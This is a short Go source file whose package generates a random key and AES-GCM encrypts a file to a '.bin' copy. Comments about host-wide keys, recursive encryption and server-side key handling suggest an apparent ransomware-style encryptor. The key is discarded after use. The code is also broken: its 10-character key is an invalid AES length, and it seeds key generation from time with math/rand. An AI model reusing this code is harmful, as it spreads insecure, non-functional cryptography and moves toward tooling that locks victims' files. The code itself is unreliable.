//Provides the key generation, encryption and decryption logic
package Encrypt

import (
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	rand "math/rand"
	"strings"
	"time"
)

type EncryptionData []byte
type DecryptedData []byte
type Hash string

//generates an encryption key for use across the host
func GenerateKey() (string, error) {
	rand.Seed(time.Now().Unix())
	chars := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
		"abcdefghijklmnopqrstuvwxyz" +
		"0123456789" +
		"!@#$%^&*")

	var b strings.Builder

	for x := 0; x < 10; x++ {
		b.WriteRune(chars[rand.Intn(len(chars))])
	}
	str := b.String()
	return str, nil
}

//encrypts recurively from the path provided as an argument
func EncryptFile(path string) error {

	//read the file
	plaintext, err := ioutil.ReadFile(path) //TODO: Check that this is the best way to read files
	if err != nil {
		return err
	}
	//first generate a unique key
	key, err := GenerateKey() //TODO: This needs to be moved to server-side
	if err != nil {
		return err
	}

	//generate a new aes cipher using the key
	c, err := aes.NewCipher([]byte(key))
	if err != nil {
		return err
	}

	//gcm block
	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return err
	}

	//create a nounce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
		return err
	}

	//encrypt the file context
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)

	//write the encrypted file back
	filename := fmt.Sprint(path, ".bin")
	err = ioutil.WriteFile(filename, ciphertext, 0777)
	if err != nil {
		return err
	}
	return nil
}
